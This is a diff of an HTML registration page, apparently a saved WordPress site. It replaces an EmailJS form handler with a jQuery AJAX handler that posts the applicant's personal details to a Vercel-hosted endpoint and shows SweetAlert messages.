@@ -986,7 +986,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
   </form>
 </section>
 
-<script>
+<!-- <script>
     document.getElementById("myForm").addEventListener("submit", function(event) {
     event.preventDefault(); // Prevent the default form submission
 
@@ -1000,7 +1000,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
       console.log("Form validation failed.");
     }
   });
-</script>
+</script> -->
 <script>
   function updateStates() {
     // Get the selected country
@@ -1194,55 +1194,111 @@ gform.initializeOnLoaded( function() {gformInitSpinner( 1, '../wp-content/plugin
   
   </style>
     </div>
+    <script src="./jquery-3.6.0.min.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+
 <script>
-  function ValidateForm(){
+//   function ValidateForm(){
 
-  const  firstname = document.querySelector('#grid-first-name');
-    const lastname = document.querySelector('#grid-last-name');
-    const number = document.querySelector('#grid-number');
-    const email = document.querySelector('#grid-email');
-    const country = document.querySelector('#countries');
-    const city = document.querySelector('#grid-city');
-    const state = document.querySelector('#states');
-    const address = document.querySelector('#address');
-    const zip = document.querySelector('#grid-zip');
-    const shirt = document.querySelector('#shirt');
-    const code = document.querySelector('#referal-code');
-
-
-
-    // const selectBox = document.querySelector('#select');
-    // const yes = document.querySelector('#select');
-    //const no = document.querySelector('#no');
-    // const selectedIndex = selectBox.selectedIndex;
-    // const selectedOption = selectBox.options[selectedIndex].value;
+//   const  firstname = document.querySelector('#grid-first-name');
+//     const lastname = document.querySelector('#grid-last-name');
+//     const number = document.querySelector('#grid-number');
+//     const email = document.querySelector('#grid-email');
+//     const country = document.querySelector('#countries');
+//     const city = document.querySelector('#grid-city');
+//     const state = document.querySelector('#states');
+//     const address = document.querySelector('#address');
+//     const zip = document.querySelector('#grid-zip');
+//     const shirt = document.querySelector('#shirt');
+//     const code = document.querySelector('#referal-code');
 
 
-function sendMail(params){
-    var tempParams ={
-     firstname :firstname.value,
-    lastname :lastname.value,
-    number : number.value,
-    email: email.value,
-    country: country.value,
-    city : city.value,
-    state : state.value,
-    address : address.value,
-    zip : zip.value,
-    shirt : shirt.value,
-    code: code.value
+
+//     // const selectBox = document.querySelector('#select');
+//     // const yes = document.querySelector('#select');
+//     //const no = document.querySelector('#no');
+//     // const selectedIndex = selectBox.selectedIndex;
+//     // const selectedOption = selectBox.options[selectedIndex].value;
+
+
+// function sendMail(params){
+//     var tempParams ={
+//      firstname :firstname.value,
+//     lastname :lastname.value,
+//     number : number.value,
+//     email: email.value,
+//     country: country.value,
+//     city : city.value,
+//     state : state.value,
+//     address : address.value,
+//     zip : zip.value,
+//     shirt : shirt.value,
+//     code: code.value
+//     };
+//         emailjs.send("service_8y7q5q4","template_bc4hzzt",tempParams)
+//         .then(function(res){ 
+//             alert('Basic Registration successful, Our team will contact you within the next 48 hours for advance enrolment and capturing if you pass the basic enrollment.',);
+//             console.log("sucess",res.status) ;    
+//         })
+//         error => {
+//             alert( 'An error occured, Plese try again',error.text)
+//             }
+//         }
+//         return sendMail()
+// } 
+
+$(document).ready(function () {
+  $('#myForm').on('submit', function (event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    var firstName = $('#grid-first-name').val();
+    var lastName = $('#grid-last-name').val();
+    var phoneNumber = $('#grid-number').val();
+    var email = $('#grid-email').val();
+    var referralCode = $('#referal-code').val();
+    var country = $('#countries').val();
+    var city = $('#grid-city').val();
+    var state = $('#states').val();  // Assuming the state selection is implemented
+    var address = $('#address').val();
+    var zip = $('#grid-zip').val();
+    var shirt= $('#shirt').val();
+
+    // Build the data object
+    var data = {
+      firstName: firstName,
+      lastName: lastName,
+      phoneNumber: phoneNumber,
+      email: email,
+      referralCode: referralCode,
+      country: country,
+      city: city,
+      state: state,  // Assuming state data is included
+      address: address,
+      zip: zip,
+      shirt: shirt
     };
-        emailjs.send("service_8y7q5q4","template_bc4hzzt",tempParams)
-        .then(function(res){ 
+
+    $.ajax({
+      url: 'https://server-blue-mu.vercel.app/arnoldsender', // Replace with the URL to your PHP handler script
+      type: 'POST',
+      data: JSON.stringify(data),
+      contentType: 'application/json',
+      success: function (response) {
+        console.log(response);
+        swal("Application submitted successfully!", "", "success").then(() => {
             alert('Basic Registration successful, Our team will contact you within the next 48 hours for advance enrolment and capturing if you pass the basic enrollment.',);
-            console.log("sucess",res.status) ;    
-        })
-        error => {
-            alert( 'An error occured, Plese try again',error.text)
-            }
-        }
-        return sendMail()
-} 
+});
+      },
+      error: function (xhr, status, error) {
+        // Handle any errors
+        swal("An error occurred while saving the application!", "", "warning");
+        console.error(xhr.responseText);
+      }
+    });
+  });
+});
+
 </script>
         <!-- TM Floodlight Tag -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=DC-11333715"></script> 
